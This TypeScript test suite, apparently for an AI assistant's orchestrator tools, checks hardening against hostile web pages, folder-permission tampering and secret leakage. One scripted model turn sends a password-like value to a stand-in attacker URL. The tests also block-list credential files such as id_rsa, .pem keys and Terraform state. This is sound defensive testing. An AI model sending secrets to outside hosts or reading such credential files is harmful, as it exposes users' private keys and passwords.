/**
 * Naloga 19b: popravki po slepem pregledu naloge 19 (orodja orkestratorja F2). Vsak preizkus pade brez svojega popravka (mutacije
 * orodja/n19b-mutacije.py). Komentarji brez sumnikov; nevidni znaki samo prek String.fromCodePoint (nikoli dobesedno v izvorni kodi).
 */
import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, realpath, stat, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, it } from "node:test";
import { setupOwner } from "./auth.server.ts";
import { podpisSeznama, ukazClaudeNalog } from "./claude-naloge.server.ts";
import { NAJVEC_ZNAKOV_IZIDA_ORODJA, ovijPodatek, type OrodjeOrkestratorja } from "./orkestrator.ts";
import { KOS_DATOTEKE, orodjaLine } from "./orkestrator-orodja.server.ts";
import { ustvariOrkestrator, type KlicModela } from "./orkestrator.server.ts";
import { potrdiOpozorilo } from "./opozorilo.server.ts";
import type { KlicOrodja, RezultatOrodij, SporociloOrodja } from "./providers.ts";
import { zapisiObrat } from "./spomin-baza.server.ts";
import type { SpletOdv, SpletZahteva } from "./splet.ts";
import { razvrstiDejanje } from "./vprasanja-agentov.ts";

const ZWSP = String.fromCodePoint(0x200b);
const FFFD = String.fromCodePoint(0xfffd);

async function okolje(podpisi = true) {
  const baza = await realpath(await mkdtemp(path.join(tmpdir(), "lina-n19b-")));
  const root = path.join(baza, "podatki");
  const proj = path.join(baza, "projekt");
  const zunaj = path.join(baza, "zunaj");
  for (const m of [root, proj, zunaj, path.join(proj, "skrivno")]) await mkdir(m, { recursive: true });
  const prepovedane = [path.join(proj, "skrivno")];
  const p = podpisi ? { podpisMap: await podpisSeznama(root, "mape", [proj]), podpisPrepovedanih: await podpisSeznama(root, "prepovedane", prepovedane) } : {};
  await writeFile(path.join(root, "claude-naloge.json"), JSON.stringify({ v: 1, mape: [proj], naloge: [], prepovedane, ...p }));
  await writeFile(path.join(proj, "beri.txt"), "prva vrstica\n");
  await writeFile(path.join(proj, "skrivno", "a.txt"), "prepovedano");
  await writeFile(path.join(zunaj, "tuje.txt"), "zunaj");
  return { baza, root, proj, zunaj };
}

const ctx = () => ({ nalogaId: "o-0000000000000000", signal: new AbortController().signal });
const poImenu = (o: OrodjeOrkestratorja[]) => new Map(o.map((x) => [x.definicija.ime, x]));
const orodje = (root: string, ime: string, odv = {}) => poImenu(orodjaLine(root, odv)).get(ime)!;

function lazniSplet(html: (z: SpletZahteva) => string): SpletOdv & { zahteve: SpletZahteva[] } {
  const zahteve: SpletZahteva[] = [];
  return {
    zahteve,
    razresi: async () => ["93.184.216.34"],
    povezava: async (z) => {
      zahteve.push(z);
      const robots = z.pot === "/robots.txt";
      const telo = Buffer.from(robots ? "" : html(z));
      return {
        status: robots ? 404 : 200,
        glave: { "content-type": robots ? "text/plain" : "text/html; charset=utf-8" },
        telo: (async function* () { yield telo; })(),
        prekini: () => undefined,
      };
    },
  };
}

const klic = (ime: string, argumenti: Record<string, unknown> = {}): KlicOrodja => ({ id: "x", ime, argumenti });
const odg = (klici: KlicOrodja[], besedilo = ""): RezultatOrodij => ({ ok: true, besedilo, klici, usage: { vhod: 10, izhod: 5, predpomnjeni: 0 }, razlogKonca: klici.length ? "orodje" : "konec" });
function scenarij(koraki: RezultatOrodij[]) {
  const vhodi: SporociloOrodja[][] = [];
  let i = 0;
  const f: KlicModela = async (s) => {
    vhodi.push(s.map((x) => ({ ...x })) as SporociloOrodja[]);
    return koraki[Math.min(i++, koraki.length - 1)]!;
  };
  return { f, vhodi };
}
const brez = { oceni: null, ucenje: null, imaGeslo: async () => true } as const;
async function cakaj(fn: () => Promise<boolean> | boolean, ms = 4000): Promise<void> {
  const konec = Date.now() + ms;
  while (Date.now() < konec) {
    if (await fn()) return;
    await new Promise((r) => setTimeout(r, 10));
  }
  throw new Error("pogoj ni izpolnjen");
}

const napakaIz = (r: unknown) => (r && typeof r === "object" && "napaka" in r ? String((r as { napaka: unknown }).napaka) : "");
const izid = (r: unknown) => (r && typeof r === "object" && "rezultat" in r ? String((r as { rezultat: unknown }).rezultat) : "");

describe("naloga 19b N1: branje strani v linearnem casu (napadalceva stran z nezaprtimi oznakami)", () => {
  const MB = 999_000;
  const ponovi = (kos: string, konec = "") => kos.repeat(Math.floor((MB - konec.length) / kos.length)) + konec;
  const oblike: Array<[string, string]> = [
    ["<p>", ponovi("<p>")],
    ["<p brez >", ponovi("<p ")],
    ["<script", ponovi("<script")],
    ["<li>", ponovi("<li>")],
    ["<h1>", ponovi("<h1>")],
    ["<a ", ponovi("<a ")],
    ["<a href= brez >", ponovi('<a href="x ')],
    ["<!--", ponovi("<!--")],
    ["<td>", ponovi("<td>")],
    ["<title>", ponovi("<title>")],
    ["<p> + < + </p>", "<p>" + "<".repeat(MB - 10) + "</p>"],
    ["JSON-LD brez >", ponovi('<script type="application/ld+json" ')],
  ];
  for (const [ime, html] of oblike) {
    it(`1 MB ${ime}: pod 1 s`, { timeout: 30_000 }, async () => {
      const { root } = await okolje();
      const t0 = performance.now();
      const r = await orodje(root, "preberi_stran", { splet: lazniSplet(() => html), tinyfish: async () => null }).izvedi({ naslov: "https://napadalec.primer.si/" }, ctx());
      const ms = performance.now() - t0;
      assert.ok(ms < 1000, `${ime}: ${Math.round(ms)} ms`);
      assert.ok(r && typeof r === "object", "izid je objekt");
    });
  }

  it("obicajna stran: naslov, odstavki, seznami, tabela, naslovi, entitete; skripta in komentar nista besedilo", async () => {
    const { root } = await okolje();
    const html = "<html><head><title>Mizar &amp; sin</title><script>var x = '<p>skrito</p>';</script></head><body><!-- <p>komentar</p> -->"
      + "<h1>Ponudba</h1><p>Mize <b>iz hrasta</b> &lt;po meri&gt;.</p><ul><li>Hrast</li><li>Bukev</li></ul><table><tr><td>Rok</td><th>14 dni</th></tr></table>"
      + "<style>p{color:red}</style><p>a &lt; b in c > d</p></body></html>";
    const r = await orodje(root, "preberi_stran", { splet: lazniSplet(() => html) }).izvedi({ naslov: "https://mizar.primer.si/" }, ctx());
    const t = izid(r);
    assert.match(t, /\(Mizar & sin\)/);
    for (const d of ["Ponudba", "Mize iz hrasta <po meri>.", "Hrast", "Bukev", "Rok", "14 dni", "a < b in c > d"]) assert.ok(t.includes(d), `${d} v ${t}`);
    for (const ne of ["skrito", "komentar", "color"]) assert.ok(!t.includes(ne), `${ne} ni besedilo: ${t}`);
  });
});

describe("naloga 19b N17: neveljaven kodni znak ne zrusi branja", () => {
  it("&#99999999; &#x110000; dolga stevka in nadomestni par postanejo U+FFFD, stran se prebere", async () => {
    const { root } = await okolje();
    const html = `<p>A&#99999999;B&#x110000;C&#${"9".repeat(400)};D&#xFFFFFFFFFFFF;E&#xD800;F &#269;&#x161;</p>`;
    const r = await orodje(root, "preberi_stran", { splet: lazniSplet(() => html) }).izvedi({ naslov: "https://napadalec.primer.si/" }, ctx());
    assert.ok("ok" in r && r.ok, JSON.stringify(r));
    const t = izid(r);
    assert.ok(t.includes(`A${FFFD}B${FFFD}C${FFFD}D${FFFD}E`), t);
    assert.ok(t.includes("čš"), "veljavne entitete ostanejo (c in s s strešico)");
  });
});

describe("naloga 19b N2: dovoljene in prepovedane mape samo s podpisom ukaza lastnika", () => {
  it("nepodpisana datoteka (podtaknjena ali starejsa razlicica): orodja ne berejo nicesar", async () => {
    const { root, proj } = await okolje(false);
    const r = await orodje(root, "preberi_datoteko").izvedi({ pot: path.join(proj, "beri.txt") }, ctx());
    assert.match(napakaIz(r), /potrjene z geslom/);
  });

  it("dodana mapa (npr. ~/.ssh) s starim podpisom: zavrnjeno", async () => {
    const { root, proj, zunaj } = await okolje();
    const f = path.join(root, "claude-naloge.json");
    const s = JSON.parse(await readFile(f, "utf8"));
    s.mape.push(zunaj);
    await writeFile(f, JSON.stringify(s));
    for (const pot of [path.join(zunaj, "tuje.txt"), path.join(proj, "beri.txt")]) {
      assert.match(napakaIz(await orodje(root, "preberi_datoteko").izvedi({ pot }, ctx())), /potrjene z geslom/);
    }
  });

  it("izpraznjene prepovedane (podpis ostane) ali podpis prenesen s seznama map: zavrnjeno", async () => {
    const { root, proj } = await okolje();
    const f = path.join(root, "claude-naloge.json");
    const s = JSON.parse(await readFile(f, "utf8"));
    await writeFile(f, JSON.stringify({ ...s, prepovedane: [] }));
    assert.match(napakaIz(await orodje(root, "preberi_datoteko").izvedi({ pot: path.join(proj, "skrivno", "a.txt") }, ctx())), /potrjene z geslom/);
    await writeFile(f, JSON.stringify({ ...s, prepovedane: s.mape, podpisPrepovedanih: s.podpisMap }));
    assert.match(napakaIz(await orodje(root, "preberi_datoteko").izvedi({ pot: path.join(proj, "beri.txt") }, ctx())), /potrjene z geslom/);
  });

  it("pokvarjena datoteka: fail-closed", async () => {
    const { root, proj } = await okolje();
    await writeFile(path.join(root, "claude-naloge.json"), "{ne json");
    assert.match(napakaIz(await orodje(root, "preberi_datoteko").izvedi({ pot: path.join(proj, "beri.txt") }, ctx())), /potrjene z geslom|Ni dovoljenih/);
  });

  it("krog zapis-branje: ukaz lastnika mape in prepovedane podpise, drug zapis stanja podpis ohrani, orodje bere", async () => {
    const { baza, root, proj } = await okolje(false);
    const token = await setupOwner("geslo-test-1234", root);
    await potrdiOpozorilo(root);
    const o = { dom: path.join(baza, "dom") };
    await mkdir(o.dom, { recursive: true });
    const beri = async () => orodje(root, "preberi_datoteko").izvedi({ pot: path.join(proj, "beri.txt") }, ctx());
    // starejsa razlicica z nepodpisanimi prepovedanimi: ukaz mape jih NE podpise (podtaknjen seznam bi postal veljaven)
    await ukazClaudeNalog(token, { ukaz: "mape", mape: [proj] }, root, o);
    assert.match(napakaIz(await beri()), /potrjene z geslom/, "nepodpisane prepovedane ostanejo neveljavne");
    // nova namestitev brez prepovedanih: ukaz mape podpise tudi prazen seznam prepovedanih
    await writeFile(path.join(root, "claude-naloge.json"), JSON.stringify({ v: 1, mape: [], naloge: [] }));
    await ukazClaudeNalog(token, { ukaz: "mape", mape: [proj] }, root, o);
    assert.match(izid(await beri()), /prva vrstica/, "prazne prepovedane se podpisejo z ukazom mape");
    await ukazClaudeNalog(token, { ukaz: "prepovedane", mape: [path.join(proj, "skrivno")] }, root, o);
    await ukazClaudeNalog(token, { ukaz: "agenti", agenti: { pi: false } }, root, o);
    assert.match(izid(await orodje(root, "preberi_datoteko").izvedi({ pot: path.join(proj, "beri.txt") }, ctx())), /prva vrstica/);
    assert.match(napakaIz(await orodje(root, "preberi_datoteko").izvedi({ pot: path.join(proj, "skrivno", "a.txt") }, ctx())), /prepovedana/);
  });

  it("dovoljena mapa s skritim delom poti (npr. /dom/.ssh) ni koren orodij", async () => {
    const { baza, root } = await okolje();
    const skrita = path.join(baza, ".ssh");
    await mkdir(skrita, { recursive: true });
    await writeFile(path.join(skrita, "config"), "Host x");
    const p = { podpisMap: await podpisSeznama(root, "mape", [skrita]), podpisPrepovedanih: await podpisSeznama(root, "prepovedane", []) };
    await writeFile(path.join(root, "claude-naloge.json"), JSON.stringify({ v: 1, mape: [skrita], naloge: [], prepovedane: [], ...p }));
    assert.ok(napakaIz(await orodje(root, "preberi_datoteko").izvedi({ pot: path.join(skrita, "config") }, ctx())));
  });
});

describe("naloga 19b N3: porocilo pomocnika je zasebni podatek", () => {
  it("po porocilu dodeli_pomocniku splet caka potrditev lastnika", async () => {
    const { root } = await okolje();
    const splet = lazniSplet(() => "<p>ok</p>");
    const m = scenarij([
      odg([klic("dodeli_pomocniku", { mapa: "/tmp/projekt", naloga: "Preglej projekt." })]),
      odg([klic("preberi_stran", { naslov: "https://napadalec.primer.si/?d=GESLO" })]),
      odg([], "Konec."),
    ]);
    let koncano = false;
    const o = ustvariOrkestrator(root, {
      ...brez, klicModela: m.f, orodja: orodjaLine(root, { splet }),
      predlagajPomocniku: async () => ({ id: "n-1" }),
      izidPomocnika: async () => ({ koncano, stanje: koncano ? "koncano" : "tece", porocilo: koncano ? "Vsebina .env: GESLO=x" : null }),
    });
    const n = await o.nova({ cilj: "Obsezno." });
    assert.equal((await o.teci(n.id)).faza, "caka-pomocnika");
    koncano = true;
    await o.izidPomocnika("n-1");
    await cakaj(async () => (await o.preberi(n.id))?.faza === "caka-potrditev");
    assert.equal((await o.preberi(n.id))!.odprti[0]!.ime, "preberi_stran");
    assert.equal(splet.zahteve.length, 0, "brez potrditve ni zahteve na splet");
  });
});

describe("naloga 19b N4: meja izida po koncni dolzini", () => {
  it("8000 nevidnih znakov in [[ x 4000 ne preseze meje (z ovojnico)", () => {
    for (const s of [ZWSP.repeat(8000), "[[".repeat(4000), "<<<".repeat(3000)]) {
      const o = ovijPodatek("preberi_stran", s);
      assert.ok(o.besedilo.length <= NAJVEC_ZNAKOV_IZIDA_ORODJA + 200, `${o.besedilo.length}`);
      assert.match(o.besedilo, /\[odrezano\]/);
    }
    const kratko = ovijPodatek("x", "kratko");
    assert.doesNotMatch(kratko.besedilo, /\[odrezano\]/);
  });
});

describe("naloga 19b N5: prepis datoteke, ki ni bila prebrana dobesedno", () => {
  const primeri: Array<[string, Buffer]> = [
    ["daljsa od kosa", Buffer.from("x".repeat(KOS_DATOTEKE + 10))],
    ["oznake [[", Buffer.from("a [[b]] c")],
    ["nevidni znak", Buffer.from(`a${ZWSP}b`)],
    ["neveljaven UTF-8 (windows-1250)", Buffer.from([0x6b, 0x72, 0x9a, 0x6b, 0x61])],
    ["BOM", Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from("abc")])],
    ["skrivnost", Buffer.from("token=abcdefgh12345678\n")],
  ];
  for (const [ime, vsebina] of primeri) {
    it(`${ime}: branje oznaceno NI DOBESEDNO; prepis samo s celotna: true`, async () => {
      const { root, proj } = await okolje();
      const pot = path.join(proj, "f.txt");
      await writeFile(pot, vsebina);
      assert.match(izid(await orodje(root, "preberi_datoteko").izvedi({ pot }, ctx())), /NI DOBESEDNO/);
      const pisi = orodje(root, "zapisi_datoteko");
      assert.match(napakaIz(await pisi.izvedi({ pot, vsebina: "novo", prepisi: true }, ctx())), /dobesedno/);
      assert.deepEqual(await readFile(pot), vsebina, "datoteka ostane nespremenjena");
      assert.ok("ok" in (await pisi.izvedi({ pot, vsebina: "novo", prepisi: true, celotna: true }, ctx())));
      assert.equal(await readFile(pot, "utf8"), "novo");
    });
  }
  it("dobesedno prebrana kratka datoteka: brez oznake, prepis s prepisi: true", async () => {
    const { root, proj } = await okolje();
    const pot = path.join(proj, "beri.txt");
    assert.doesNotMatch(izid(await orodje(root, "preberi_datoteko").izvedi({ pot }, ctx())), /NI DOBESEDNO/);
    const r = await orodje(root, "zapisi_datoteko").izvedi({ pot, vsebina: "nova", prepisi: true }, ctx());
    assert.ok("ok" in r && r.ok, JSON.stringify(r));
  });
  it("celotna je v shemi in v predogledu potrditve pred vsebino", () => {
    const d = orodje("/tmp/x", "zapisi_datoteko").definicija;
    assert.ok((d.parametri as { properties: Record<string, unknown> }).properties.celotna);
  });
});

describe("naloga 19b N6: razvrstitev orodij orkestratorja", () => {
  it("zapisi_datoteko, ustvari_opomnik, isci_splet, preberi_stran niso neznana", () => {
    assert.deepEqual(razvrstiDejanje("zapisi_datoteko", { pot: "/dom/projekt/opis.md", vsebina: "x" }, "").razlogi, []);
    for (const p of ["/dom/projekt/CLAUDE.md", "/dom/projekt/AGENTS.md", "/dom/projekt/package.json", "/dom/projekt/Makefile", "/dom/projekt/zazeni.sh"]) {
      assert.deepEqual(razvrstiDejanje("zapisi_datoteko", { pot: p, vsebina: "x" }, "").razlogi, ["nastavitve"], p);
    }
    assert.deepEqual(razvrstiDejanje("ustvari_opomnik", { vrsta: "opomnik", naslov: "x", cas: "2026-11-27T10:00" }, "").razlogi, []);
    assert.deepEqual(razvrstiDejanje("isci_splet", { poizvedba: "x" }, "").razlogi, ["omrezje"]);
    assert.deepEqual(razvrstiDejanje("preberi_stran", { naslov: "https://x.si/" }, "").razlogi, ["omrezje"]);
    assert.deepEqual(razvrstiDejanje("neko_orodje", {}, "").razlogi, ["neznano"]);
  });
});

describe("naloga 19b N7: odgovor za pot zunaj dovoljenih map ne izda obstoja", () => {
  it("obstojeca in neobstojeca pot zunaj: enako sporocilo (branje in pisanje)", async () => {
    const { root, zunaj } = await okolje();
    const beri = orodje(root, "preberi_datoteko");
    const a = napakaIz(await beri.izvedi({ pot: path.join(zunaj, "tuje.txt") }, ctx()));
    const b = napakaIz(await beri.izvedi({ pot: path.join(zunaj, "ni-je.txt") }, ctx()));
    assert.equal(a, b);
    assert.match(a, /ni v dovoljeni mapi/);
    const pisi = orodje(root, "zapisi_datoteko");
    assert.equal(napakaIz(await pisi.izvedi({ pot: path.join(zunaj, "nima", "x.txt"), vsebina: "x" }, ctx())), a);
  });
});

describe("naloga 19b N11: datoteke s skrivnostmi in skrivnosti v izidu", () => {
  it("id_rsa, *.pem, *.key, credentials*.json, secrets.*, *.tfstate se ne berejo (tudi prek povezave)", async () => {
    const { root, proj } = await okolje();
    const beri = orodje(root, "preberi_datoteko");
    for (const ime of ["id_rsa", "id_ed25519", "streznik.pem", "tls.key", "credentials.json", "credentials-gcp.json", "secrets.yaml", "terraform.tfstate", "terraform.tfstate.backup"]) {
      await writeFile(path.join(proj, ime), "SKRIVNO");
      assert.match(napakaIz(await beri.izvedi({ pot: path.join(proj, ime) }, ctx())), /skrivnost/i, ime);
    }
    await symlink(path.join(proj, "id_rsa"), path.join(proj, "nedolzno.txt"));
    assert.match(napakaIz(await beri.izvedi({ pot: path.join(proj, "nedolzno.txt") }, ctx())), /skrivnost/i);
  });

  it("izid orodja gre k modelu z zakritimi skrivnostmi (poti ostanejo)", async () => {
    const { root, proj } = await okolje();
    const kljuc = "sk-" + "A".repeat(30);
    await writeFile(path.join(proj, "opis.txt"), `kljuc ponudnika ${kljuc}\n`);
    const m = scenarij([odg([klic("preberi_datoteko", { pot: path.join(proj, "opis.txt") })]), odg([], "Konec.")]);
    const o = ustvariOrkestrator(root, { ...brez, klicModela: m.f, orodja: orodjaLine(root) });
    await o.teci((await o.nova({ cilj: "Preberi opis." })).id);
    const vhod = JSON.stringify(m.vhodi[1]);
    assert.ok(!vhod.includes(kljuc), "kljuc ne gre k modelu");
    assert.ok(vhod.includes("[zakrito]"));
    assert.ok(vhod.includes(path.join(proj, "opis.txt")), "absolutna pot ostane");
  });
});

describe("naloga 19b N12: poisci_v_znanju samo v pogovorih asistentke", () => {
  it("obrat druge seje (klic) se ne vrne", async () => {
    const { root } = await okolje();
    await zapisiObrat({ seja: "klic-123", vloga: "klicatelj", besedilo: "Moja stevilka kartice je zaupna mizarska" }, { dir: root, vklopljen: true });
    await zapisiObrat({ seja: "asistent", vloga: "uporabnik", besedilo: "Mizarska delavnica v petek" }, { dir: root, vklopljen: true });
    const t = izid(await orodje(root, "poisci_v_znanju").izvedi({ poizvedba: "mizarska" }, ctx()));
    assert.ok(t.includes("delavnica"), `obrat asistentke je najden: ${t}`);
    assert.ok(!t.includes("kartice"), t);
  });
});

describe("naloga 19b N14: nova datoteka ni berljiva drugim", () => {
  it("zapisi_datoteko ustvari datoteko 0600", async () => {
    const { root, proj } = await okolje();
    const pot = path.join(proj, "nova.txt");
    const r = await orodje(root, "zapisi_datoteko").izvedi({ pot, vsebina: "x" }, ctx());
    assert.ok("ok" in r && r.ok, JSON.stringify(r));
    assert.equal((await stat(pot)).mode & 0o777, 0o600);
  });
});
